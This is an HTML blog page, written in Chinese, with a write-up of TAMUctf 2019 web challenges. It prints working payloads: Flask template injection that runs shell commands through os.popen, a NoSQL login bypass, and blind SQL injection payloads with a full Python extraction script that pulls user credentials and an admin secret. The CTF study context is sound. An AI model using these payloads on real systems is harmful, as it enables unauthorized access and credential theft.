@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="3月初的一个比赛，最近才复现做完TAMUctf2019">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tamuctf2019 web wp">
+<meta property="og:url" content="http://yoursite.com/2019/03/31/tamuctf2019-web-wp/index.html">
+<meta property="og:site_name" content="shifeng_kazeの家">
+<meta property="og:description" content="3月初的一个比赛，最近才复现做完TAMUctf2019">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/c8daa8e77c99a8b6608a806bb2a5833e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/3c2eb0de79eba5a0b57392bc34ef32d5.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/ff09dcd63dd6f376c96828885851416b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/da07740e89be5bec506b66ab9da8d777.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/0338b39be423310ae668622f9605c871.png">
+<meta property="og:updated_time" content="2019-03-31T06:03:48.254Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="tamuctf2019 web wp">
+<meta name="twitter:description" content="3月初的一个比赛，最近才复现做完TAMUctf2019">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/c8daa8e77c99a8b6608a806bb2a5833e.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/31/tamuctf2019-web-wp/">
+
+
+
+
+
+  <title>tamuctf2019 web wp | shifeng_kazeの家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">shifeng_kazeの家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/31/tamuctf2019-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="shifeng_kaze">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="shifeng_kazeの家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">tamuctf2019 web wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-31T13:38:01+08:00">
+                2019-03-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>3月初的一个比赛，最近才复现做完<br><a href="https://github.com/tamuctf/TAMUctf-2019" target="_blank" rel="noopener">TAMUctf2019</a></p>
+<a id="more"></a>
+<h2 id="Not-Another-SQLi-Challenge"><a href="#Not-Another-SQLi-Challenge" class="headerlink" title="Not Another SQLi Challenge"></a>Not Another SQLi Challenge</h2><p>很简单，万能密码过</p>
+<h2 id="Robots-Rule"><a href="#Robots-Rule" class="headerlink" title="Robots Rule"></a>Robots Rule</h2><p>打开robots.txt，提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WHAT IS UP, MY FELLOW HUMAN!</span><br><span class="line">HAVE YOU RECEIVED SECRET INFORMATION ON THE DASTARDLY GOOGLE ROBOTS?!</span><br><span class="line">YOU CAN TELL ME, A FELLOW NOT-A-ROBOT!</span><br></pre></td></tr></table></figure>
+<p>于是把user-agent改为googlebot即可</p>
+<h2 id="Science"><a href="#Science" class="headerlink" title="Science!"></a>Science!</h2><p>进入提示Flask框架那应该就是SSTI了<br>然后尝试2发现上下两个输入框的结果都为2，于是开始搞事</p>
+<p>然而正常操作好像不行orz<br>于是用另一种操作</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.os.__dict__.popen(&apos;ls&apos;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.os.__dict__.popen(&apos;cat flag.txt&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里url_for是flask框架的一个函数，简单来说就是该函数的内核中有os模块，于是再通过<strong>dict</strong>去使用os模块中的popen()函数</p>
+<h2 id="Many-Gig’ems-to-you"><a href="#Many-Gig’ems-to-you" class="headerlink" title="Many Gig’ems to you!"></a>Many Gig’ems to you!</h2><p>打开后有cookies就抓个包，发现</p>
+<p><img src="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/c8daa8e77c99a8b6608a806bb2a5833e.png" alt=""></p>
+<p>于是猜测gigem_continue是flag的一段，然后F12查看网站的源码看看</p>
+<p><img src="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/3c2eb0de79eba5a0b57392bc34ef32d5.png" alt=""></p>
+<p>于是把这两段连起来提交然而不对<br>但提示flag in cookies那就打开cookies这个页面的链接<br>然后F12继续在源码中寻找，发现</p>
+<p><img src="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/ff09dcd63dd6f376c96828885851416b.png" alt=""></p>
+<p>于是把source_and_接上得到flag</p>
+<h2 id="LoginApp"><a href="#LoginApp" class="headerlink" title="LoginApp"></a>LoginApp</h2><p>这题比赛时没搞出来，结束后看wp才知道是一道基础的<a href="">nosql注入</a></p>
+<p>在复现做的时候迷之burpsuite抓不到包，于是只能手动弄http报文<br>F12可以看到用了ajax，将输入的username和password打包成json，以post方式发向login</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;#submit&quot;).on(&apos;click&apos;, function()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &apos;login&apos;, </span><br><span class="line">        type : &quot;POST&quot;, </span><br><span class="line">        dataType : &apos;json&apos;, </span><br><span class="line">        data : JSON.stringify(&#123;&quot;username&quot;: $(&quot;#username&quot;).val(), &quot;password&quot;: $(&quot;#password&quot;).val()&#125;),</span><br><span class="line">        contentType: &apos;application/json;charset=UTF-8&apos;,</span><br><span class="line">        success : function(result) &#123;</span><br><span class="line">            $(&quot;.result&quot;).html(result);</span><br><span class="line">            console.log(result);</span><br><span class="line">            alert(result);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(xhr, resp, text) &#123;</span><br><span class="line">            $(&quot;.result&quot;).html(&quot;Something went wrong&quot;); </span><br><span class="line">            console.log(xhr, resp, text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>于是就写一段js生成要post的json字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    alert(JSON.stringify(&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>修改一下content-type，发包得到flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/da07740e89be5bec506b66ab9da8d777.png" alt=""></p>
+<p>payload：<br><code>{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}</code></p>
+<h2 id="BirdBox"><a href="#BirdBox" class="headerlink" title="BirdBox"></a>BirdBox</h2><p>这题比赛时就觉得是一道盲注，比较正确和错误时是很明显的两个页面</p>
+<p>然后就上python脚本<br>然而只能跑出注释里给出的值，而且列，表和库都只有一个<br>看了wp才知道是放在user里，以后还是要仔细点做orz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-  </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = r&apos;http://localhost/Website/Search.php?Search=&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1):</span><br><span class="line"></span><br><span class="line">	l1 = 0</span><br><span class="line">	r1 = 100</span><br><span class="line"></span><br><span class="line">	while(l1&lt;=r1):</span><br><span class="line">		mid1 = (l1 + r1)/2	</span><br><span class="line">		payload = &quot;1&apos;^((select length(user()))=&quot;+str(mid1)+&quot;)^&apos;&quot;</span><br><span class="line">		new_url = url + payload</span><br><span class="line">		print new_url</span><br><span class="line">		try:</span><br><span class="line">			http = requests.get(new_url,timeout=5)</span><br><span class="line">		except requests.exceptions.Timeout:</span><br><span class="line">			for p in range(1, 10):</span><br><span class="line">				print &quot;p&quot;+str(p)</span><br><span class="line">				try:</span><br><span class="line">					http = requests.get(new_url,timeout=5)</span><br><span class="line">					time.sleep(5)</span><br><span class="line">				except requests.exceptions.Timeout:</span><br><span class="line">							pass</span><br><span class="line">				if http.content:</span><br><span class="line">							break</span><br><span class="line">		time.sleep(1)</span><br><span class="line">		if re.findall(r&quot;&lt;h1&gt;(.*)&lt;/h1&gt;&quot;,http.content)[0] == &apos;Nice try, nothing to see here.&apos; :</span><br><span class="line">			break</span><br><span class="line">		else:</span><br><span class="line">			payload = &quot;1&apos;^((select length(user()))&lt;&quot;+str(mid1)+&quot;)^&apos;&quot;</span><br><span class="line">			new_url = url + payload</span><br><span class="line">			print new_url</span><br><span class="line">			try:</span><br><span class="line">				http = requests.get(new_url,timeout=5)</span><br><span class="line">			except requests.exceptions.Timeout:</span><br><span class="line">				for p in range(1, 10):</span><br><span class="line">					print &quot;p&quot;+str(p)</span><br><span class="line">					try:</span><br><span class="line">						http = requests.get(new_url,timeout=5)</span><br><span class="line">						time.sleep(5)</span><br><span class="line">					except requests.exceptions.Timeout:</span><br><span class="line">								pass</span><br><span class="line">					if http.content:</span><br><span class="line">								break</span><br><span class="line">			time.sleep(1)</span><br><span class="line">			if re.findall(r&quot;&lt;h1&gt;(.*)&lt;/h1&gt;&quot;,http.content)[0] == &apos;Nice try, nothing to see here.&apos; :</span><br><span class="line">				r1 = mid1 - 1</span><br><span class="line">			else:</span><br><span class="line">				l1 = mid1 + 1</span><br><span class="line"></span><br><span class="line">	if mid1==0:</span><br><span class="line">		break</span><br><span class="line">	print </span><br><span class="line">	print str(i)+&quot;:&quot;+str(mid1)</span><br><span class="line">	k = &apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	for j in range(mid1):</span><br><span class="line"></span><br><span class="line">		l2 = 0</span><br><span class="line">		r2 = 128</span><br><span class="line"></span><br><span class="line">		while(l2&lt;=r2):</span><br><span class="line">			mid2 = (l2 + r2)/2	</span><br><span class="line">			payload = &quot;1&apos;^((select ascii(mid(user(),&quot;+str(j+1)+&quot;,1)))=&quot;+str(mid2)+&quot;)^&apos;&quot;</span><br><span class="line">			new_url = url + payload</span><br><span class="line">			print new_url</span><br><span class="line">			try:</span><br><span class="line">				http = requests.get(new_url,timeout=5)</span><br><span class="line">			except requests.exceptions.Timeout:</span><br><span class="line">				for p in range(1, 10):</span><br><span class="line">					print &quot;p&quot;+str(p)</span><br><span class="line">					try:</span><br><span class="line">						http = requests.get(new_url,timeout=5)</span><br><span class="line">						time.sleep(5)</span><br><span class="line">					except requests.exceptions.Timeout:</span><br><span class="line">								pass</span><br><span class="line">					if http.content:</span><br><span class="line">								break</span><br><span class="line">			time.sleep(1)</span><br><span class="line">			if re.findall(r&quot;&lt;h1&gt;(.*)&lt;/h1&gt;&quot;,http.content)[0] == &apos;Nice try, nothing to see here.&apos; :</span><br><span class="line">				q = mid2</span><br><span class="line">				break</span><br><span class="line">			else:</span><br><span class="line">				payload = &quot;1&apos;^((select ascii(mid(user(),&quot;+str(j+1)+&quot;,1)))&lt;&quot;+str(mid2)+&quot;)^&apos;&quot;</span><br><span class="line">				new_url = url + payload</span><br><span class="line">				print new_url</span><br><span class="line">				try:</span><br><span class="line">					http = requests.get(new_url,timeout=5)</span><br><span class="line">				except requests.exceptions.Timeout:</span><br><span class="line">					for p in range(1, 10):</span><br><span class="line">						print &quot;p&quot;+str(p)</span><br><span class="line">						try:</span><br><span class="line">							http = requests.get(new_url,timeout=5)</span><br><span class="line">							time.sleep(5)</span><br><span class="line">						except requests.exceptions.Timeout:</span><br><span class="line">									pass</span><br><span class="line">						if http.content:</span><br><span class="line">									break</span><br><span class="line">				time.sleep(1)</span><br><span class="line">				if re.findall(r&quot;&lt;h1&gt;(.*)&lt;/h1&gt;&quot;,http.content)[0] == &apos;Nice try, nothing to see here.&apos; :</span><br><span class="line">					r2 = mid2 - 1</span><br><span class="line">				else:</span><br><span class="line">					l2 = mid2 + 1</span><br><span class="line"></span><br><span class="line">		print </span><br><span class="line">		k = k+chr(q)</span><br><span class="line">		print k</span><br><span class="line"></span><br><span class="line">	print</span><br></pre></td></tr></table></figure>
+<p>payload：<br><code>1&#39;^((select length(user()))=50)^&#39;</code><br><code>1&#39;^((select ascii(mid(user(),1,1)))=64)^&#39;</code></p>
+<h2 id="l33tSecurity"><a href="#l33tSecurity" class="headerlink" title="l33tSecurity"></a>l33tSecurity</h2><p>和上题一样也是一道盲注题，比较坑的地方是跳转到message页面的那个按钮太小了，看了好久才找到这个页面orz</p>
+<p>message页面一看url就觉得有注入点，也是很明显的盲注，同样上脚本</p>
+<p><code>1&#39; and ((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=50) and &#39;1</code><br><code>1&#39; and ((select ascii(mid((group_concat(table_name)),1,1)) from information_schema.tables where table_schema=database())=64) and &#39;1</code></p>
+<p>跑出messages,users<br>然后接着查users表</p>
+<p><code>1&#39; and ((select length(group_concat(column_name)) from information_schema.columns where table_name=&#39;users&#39;)=50) and &#39;1</code><br><code>1&#39; and ((select ascii(mid((group_concat(column_name)),1,1)) from information_schema.columns where table_name=&#39;users&#39;)=64) and &#39;1</code></p>
+<p>跑出<code>UserID,Username,Password,FirstName,LastName,Phone,Email,Description,CreateDate,Secret</code><br>感觉UserID,Username,Password和Secret会有用，于是继续注入</p>
+<p><code>1&#39; and ((select length(group_concat(</code>UserID<code>,&#39;  &#39;,</code>Username<code>,&#39;  &#39;,</code>Password<code>,&#39;  &#39;,</code>Secret<code>)) from users)=250) and &#39;1</code><br><code>1&#39; and ((select ascii(mid((group_concat(</code>UserID<code>,&#39;  &#39;,</code>Username<code>,&#39;  &#39;,</code>Password<code>,&#39;  &#39;,</code>Secret<code>)),1,1)) from users)=64) and &#39;1</code></p>
+<p>拿到了所有用户的信息，最重要的还是admin的</p>
+<p><code>1  1337-admin  02ca0b0603222a090fe2fbf3ba97d90c  WIFHXDZ3BOHJMJSC</code></p>
+<p>密码应该是md5加密过用不了，于是试着抓包看看，发现cookie里有id和secret</p>
+<p><img src="http://shifeng-kaze.cn/blog/tamuctf2019_web_wp/0338b39be423310ae668622f9605c871.png" alt=""></p>
+<p>于是修改一下cookie再发送得到flag</p>
+<h2 id="Buckets"><a href="#Buckets" class="headerlink" title="Buckets"></a>Buckets</h2><p>这题要注册一个亚马逊服务器，有点麻烦就没复现</p>
+<p>这题参考这里<br><a href="https://www.freebuf.com/articles/web/135313.html" target="_blank" rel="noopener">针对亚马逊云存储器S3 BUCKET的渗透测试</a></p>
+<p>不是看得很懂，大概是在AmazonS3上，我们可以尝试用<code>http://bucketname.s3.amazonaws.com</code>这样的方式去探查不受访问权限限制的bucket，如果成功就会返回一个目录列表，然后就能各种搞事了</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/12/adworld-web-wp/" rel="next" title="adworld web wp">
+                <i class="fa fa-chevron-left"></i> adworld web wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="shifeng_kaze">
+            
+              <p class="site-author-name" itemprop="name">shifeng_kaze</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Not-Another-SQLi-Challenge"><span class="nav-number">1.</span> <span class="nav-text">Not Another SQLi Challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Robots-Rule"><span class="nav-number">2.</span> <span class="nav-text">Robots Rule</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Science"><span class="nav-number">3.</span> <span class="nav-text">Science!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Many-Gig’ems-to-you"><span class="nav-number">4.</span> <span class="nav-text">Many Gig’ems to you!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LoginApp"><span class="nav-number">5.</span> <span class="nav-text">LoginApp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BirdBox"><span class="nav-number">6.</span> <span class="nav-text">BirdBox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#l33tSecurity"><span class="nav-number">7.</span> <span class="nav-text">l33tSecurity</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Buckets"><span class="nav-number">8.</span> <span class="nav-text">Buckets</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shifeng_kaze</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
